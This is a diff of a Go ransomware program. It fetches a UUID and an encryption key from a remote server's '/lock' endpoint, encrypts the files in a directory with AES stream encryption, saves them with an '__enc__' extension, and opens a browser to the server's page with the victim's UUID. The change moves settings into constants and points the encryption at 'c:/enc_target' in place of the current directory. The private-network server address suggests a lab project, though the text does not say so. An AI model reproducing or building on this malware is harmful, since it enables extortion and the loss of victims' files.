@@ -14,11 +14,11 @@ import "log"
 import "os/exec"
 import "runtime"
 
-// The extension that the encrypted files will have
-var encryption_extension string = "__enc__"
-
-// The API's URL for getting the UUID and the encryption key
-var base_url string = "http://192.168.24.231"
+const (
+    EncExte = "__enc__"
+    EncPath = "c:/enc_target"
+    ServUrl = "http://192.168.24.231"
+)
 
 // The response struct for holding the uuid and the 16 byte key that the API sends
 type Response struct {
@@ -81,7 +81,7 @@ func encryptFile(name string, key []byte) {
 
     stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)
     // Create file with encrypted content
-    createFileWithContents(name+encryption_extension, ciphertext)
+    createFileWithContents(name+EncExte, ciphertext)
 }
 
 // Function for creating a file based on the text that is received
@@ -99,7 +99,7 @@ func createFileWithContents(file string, text []byte) {
 
 // Function for getting the uuid and the encryption key
 func makeRemoteCall() (string, string) {
-    url := base_url + "/lock"
+    url := ServUrl + "/lock"
     req, err := http.NewRequest("GET", url, nil)
     req.Header.Set("Content-Type", "application/json")
 
@@ -133,13 +133,13 @@ func openBrowser(url string) bool {
 
 func main() {
     // Get the current directory
-    dir, _ := os.Getwd()
+    // dir, _ := os.Getwd()
     // Make the remote call to the server to get the uuid and the key to encrypt
     uuid_16, key_16 := makeRemoteCall()
     fmt.Println("uuid:", uuid_16)
     key := []byte(key_16)
     // Encrypt directory and its files with the key
-    encryptDirectory(dir, key)
+    encryptDirectory(EncPath, key)
     // Open browser with the UUID at the end of the url.
-    openBrowser(base_url + "/static/index.html?uuid=" + uuid_16)
+    openBrowser(ServUrl + "/static/index.html?uuid=" + uuid_16)
 }
